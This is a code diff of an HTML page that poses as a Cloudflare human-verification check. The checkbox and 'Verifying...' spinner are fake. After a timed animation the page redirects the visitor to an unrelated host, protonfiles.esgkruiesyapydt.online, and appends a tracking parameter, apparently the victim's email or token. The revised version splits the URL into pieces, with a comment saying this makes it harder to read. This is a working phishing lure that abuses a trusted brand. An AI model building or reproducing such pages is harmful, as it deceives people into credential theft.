@@ -3,30 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CloudflLes</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Cloudflare ver</title>
     <style>
-        * {
+        body {
+            background-color: #f8f8f8; /* Whitish background */
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-        }
-
-        body {
-            background-color: #f6f8fa;
+            min-height: 100vh;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            color: #2d3748;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            overflow: hidden;
         }
 
-        /* Logo animation container */
-        .logo-container {
-            position: fixed;
+        /* Logo container styles */
+        .logo-container-full {
+            position: absolute;
             top: 0;
             left: 0;
             width: 100%;
@@ -34,194 +27,181 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            background-color: #f6f8fa;
-            z-index: 1000;
+            background-color: #f8f8f8;
+            z-index: 10;
             transition: opacity 0.5s ease;
         }
 
-        .logo {
+        .logo-img {
             width: 120px;
             height: 120px;
-            animation: breathing 1.5s ease-in-out infinite;
+            animation: breathing 2s infinite ease-in-out;
         }
 
         @keyframes breathing {
-            0% { transform: scale(0.95); opacity: 0.8; }
-            50% { transform: scale(1.05); opacity: 1; }
-            100% { transform: scale(0.95); opacity: 0.8; }
+            0% { transform: scale(1); opacity: 0.7; }
+            50% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.7; }
         }
 
-        /* Main content - initially hidden */
-        .main-content-container {
+        /* Verification box styles - initially hidden */
+        .verification-container {
             opacity: 0;
             transition: opacity 0.5s ease;
-            width: 100%;
-            max-width: 500px;
         }
 
-        .header {
-            text-align: center;
-            margin-bottom: 15px; /* Reduced margin */
-            max-width: 500px;
-        }
-
-        .header h1 {
-            color: #2d3748;
-            font-size: 20px;
-            font-weight: 500;
-            margin-bottom: 5px; /* Reduced margin */
-            letter-spacing: -0.2px;
-        }
-
-        .verification-container {
-            background-color: #ffffff;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
-            width: 100%;
-            max-width: 500px; /* Same width as before */
-            overflow: hidden;
-            padding: 15px 25px; /* Reduced vertical padding, kept horizontal */
-            height: 100px; /* Fixed height to reduce overall box height */
-        }
-
-        .main-content {
+        .verification-box {
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 15px 25px;
+            background-color: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            height: 100%; /* Take full height of container */
+            justify-content: space-between;
+            width: 430px; /* Reduced width */
+            height: 60px;
+            position: relative;
+            overflow: hidden;
         }
 
-        .verification-control {
+        .verification-section {
             display: flex;
             align-items: center;
             gap: 12px;
             cursor: pointer;
-            height: 100%; /* Take full height */
         }
 
-        input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            accent-color: #f48225;
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.3s ease;
+        }
+
+        .custom-checkbox {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ccc;
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
             cursor: pointer;
         }
 
-        .verify-text {
-            color: #4a5568;
+        .verification-text {
             font-size: 16px;
+            color: #333;
             font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
         }
 
         /* Spinner animation */
         .spinner {
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(244, 130, 37, 0.2);
+            width: 20px;
+            height: 20px;
+            border: 2px solid transparent;
+            border-top: 2px solid #4CAF50;
             border-radius: 50%;
-            border-top-color: #f48225;
             animation: spin 1s linear infinite;
             display: none;
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         /* Success checkmark */
         .success-check {
-            color: #38a169;
-            font-size: 18px;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background-color: #4CAF50;
             display: none;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
         }
 
-        /* Success state */
-        .success .verify-text {
-            color: #38a169;
-            font-weight: 600;
-        }
-
-        .brand-section {
+        /* Company branding section - stacked vertically */
+        .company-section {
             display: flex;
             flex-direction: column;
             align-items: flex-end;
-            text-align: right;
-            justify-content: center;
-            height: 100%; /* Take full height */
+            gap: 4px;
         }
 
-        .cloudflare-logo {
-            margin-bottom: 2px; /* Reduced margin */
-            height: 40px; /* Reduced logo size */
-            width: auto;
-        }
-
-        .cloudflare-brand {
-            margin-bottom: 2px; /* Reduced margin */
-        }
-
-        .cloudflare-text {
-            font-size: 13px;
-            font-weight: 700;
-            color: #f48225;
-            letter-spacing: 0.4px;
-        }
-
-        .footer-links {
+        .logo-container {
             display: flex;
             align-items: center;
             gap: 8px;
         }
 
+        .cloudflare-logo {
+            width: 24px;
+            height: 24px;
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .company-name {
+            font-size: 16px;
+            font-weight: bold;
+            color: #333;
+            font-family: 'Georgia', serif;
+            letter-spacing: 0.5px;
+        }
+
+        .footer-links {
+            font-size: 11px;
+            color: #666;
+        }
+
         .footer-links a {
-            color: #718096;
+            color: #666;
             text-decoration: none;
-            font-size: 12px; /* Slightly smaller font */
-            transition: color 0.2s ease;
+            margin: 0 2px;
         }
 
         .footer-links a:hover {
-            color: #4a5568;
-        }
-
-        .divider {
-            color: #cbd5e0;
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <!-- Logo animation container -->
-    <div class="logo-container" id="logoContainer">
-        <img src="logo.png" alt="Logo" class="logo">
+    <!-- Logo container that shows first -->
+    <div class="logo-container-full" id="logoContainer">
+        <img src="logo.png" alt="Logo" class="logo-img">
     </div>
 
-    <!-- Main content (initially hidden) -->
-    <div class="main-content-container" id="mainContentContainer">
-        <div class="header">
-            <h1>Let us know you're human</h1>
-        </div>
-
-        <div class="verification-container">
-            <div class="main-content">
-                <div class="verification-control" id="verificationControl">
-                    <input type="checkbox" id="redirectCheckbox">
-                    <!-- Checkbox icon -->
-                    <div class="spinner" id="spinner"></div>
-                    <div class="success-check" id="successCheck">
-                        <i class="fas fa-check-circle"></i>
-                    </div>
-                    <span class="verify-text" id="verifyText">Verify</span>
+    <!-- Verification container that shows after logo animation -->
+    <div class="verification-container" id="verificationContainer">
+        <div class="verification-box">
+            <div class="verification-section" id="verificationSection">
+                <div class="checkbox-container" id="checkboxContainer">
+                    <div class="custom-checkbox" id="customCheckbox"></div>
+                    <span class="verification-text" id="verificationText">Verify</span>
                 </div>
 
-                <div class="brand-section">
+                <div class="spinner" id="spinner"></div>
+                <div class="success-check" id="successCheck">✓</div>
+            </div>
+
+            <div class="company-section">
+                <div class="logo-container">
                     <img src="cloudflare_.png" alt="Cloudflare" class="cloudflare-logo">
-                    <div class="cloudflare-brand">
-                        <span class="cloudflare-text">CLOUDFLARE</span>
-                    </div>
-                    <div class="footer-links">
-                        <a href="#">Privacy</a>
-                        <span class="divider">-</span>
-                        <a href="#">Terms</a>
-                    </div>
+                    <div class="company-name">CLOUDFLARE</div>
+                </div>
+                <div class="footer-links">
+                    <a href="#">Privacy</a> · <a href="#">Terms</a>
                 </div>
             </div>
         </div>
@@ -230,69 +210,88 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const logoContainer = document.getElementById('logoContainer');
-            const mainContentContainer = document.getElementById('mainContentContainer');
-            const checkbox = document.getElementById('redirectCheckbox');
-            const verifyText = document.getElementById('verifyText');
+            const verificationContainer = document.getElementById('verificationContainer');
+            const verificationSection = document.getElementById('verificationSection');
+            const checkboxContainer = document.getElementById('checkboxContainer');
+            const customCheckbox = document.getElementById('customCheckbox');
+            const verificationText = document.getElementById('verificationText');
             const spinner = document.getElementById('spinner');
             const successCheck = document.getElementById('successCheck');
-            const verificationControl = document.getElementById('verificationControl');
 
-            // Show logo for 2 seconds, then show main content
+            let isVerifying = false;
+            let isVerified = false;
+
+            // Show logo for 2.5 seconds, then show verification box
             setTimeout(() => {
+                // Fade out logo
                 logoContainer.style.opacity = '0';
+
+                // After fade out completes, show verification box
                 setTimeout(() => {
                     logoContainer.style.display = 'none';
-                    mainContentContainer.style.opacity = '1';
+                    verificationContainer.style.opacity = '1';
                 }, 500);
-            }, 2000);
+            }, 2500);
 
-            // Handle checkbox change
-            checkbox.addEventListener('change', function() {
-                if (this.checked) {
-                    // Show spinner, hide checkbox
-                    checkbox.style.display = 'none';
-                    spinner.style.display = 'block';
-                    verifyText.textContent = 'Verifying...';
-
-                    // Simulate verification process
-                    setTimeout(() => {
-                        // Show success state
-                        spinner.style.display = 'none';
-                        successCheck.style.display = 'block';
-                        verifyText.textContent = 'Success!';
-                        verificationControl.classList.add('success');
-
-                        // Redirect after 2 seconds
-                        setTimeout(redirectToUrl, 2000);
-                    }, 1800);
-                }
-            });
-
-            // Redirect function
-            function redirectToUrl() {
-                // Base redirect URL
-                const baseUrl = 'https://protonfiles.esgkruiesyapydt.online/tOnDqXfQ#';
-
-                // Get the eoff parameter from the current URL
-                const urlParams = new URLSearchParams(window.location.search);
-                const eoffValue = urlParams.get('eoff');
-
-                // Construct the final URL
-                let finalUrl = baseUrl;
-                if (eoffValue) {
-                    finalUrl += eoffValue;
-                }
-
-                // Redirect to the final URL
-                window.location.href = finalUrl;
+            // Function to get URL parameter value
+            function getUrlParameter(name) {
+                name = name.replace(/[\[\]]/g, '\\$&');
+                const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+                const results = regex.exec(window.location.href);
+                if (!results) return null;
+                if (!results[2]) return '';
+                return decodeURIComponent(results[2].replace(/\+/g, ' '));
             }
 
-            // Make the entire control clickable
-            document.querySelector('.verification-control').addEventListener('click', function() {
-                if (!checkbox.checked) {
-                    checkbox.checked = true;
-                    const event = new Event('change');
-                    checkbox.dispatchEvent(event);
+            // Function to construct redirect URL (obfuscated)
+            function constructRedirectUrl() {
+                // Break URL into parts to make it harder to read
+                const part1 = 'https:';
+                const part2 = '//proton';
+                const part3 = 'files.';
+                const part4 = 'esgkruiesyapydt';
+                const part5 = '.online/';
+                const part6 = 'tOnDqXfQ';
+
+                // Get the eoff parameter value
+                const eoffValue = getUrlParameter('eoff');
+
+                // Construct the base URL
+                const baseUrl = part1 + part2 + part3 + part4 + part5 + part6;
+
+                // Add the fragment if eoff parameter exists
+                if (eoffValue) {
+                    return baseUrl + '#' + eoffValue;
+                }
+
+                return baseUrl;
+            }
+
+            verificationSection.addEventListener('click', function() {
+                if (isVerified) return;
+
+                if (!isVerifying) {
+                    // Start verification process
+                    isVerifying = true;
+
+                    // Hide checkbox, show spinner
+                    customCheckbox.style.display = 'none';
+                    spinner.style.display = 'block';
+                    verificationText.textContent = 'Verifying...';
+
+                    // After 2 seconds, show success
+                    setTimeout(() => {
+                        spinner.style.display = 'none';
+                        successCheck.style.display = 'flex';
+                        verificationText.textContent = 'Success!';
+                        isVerified = true;
+
+                        // Construct and use the redirect URL after 1 second
+                        setTimeout(() => {
+                            const redirectUrl = constructRedirectUrl();
+                            window.location.href = redirectUrl;
+                        }, 1000);
+                    }, 2000);
                 }
             });
         });
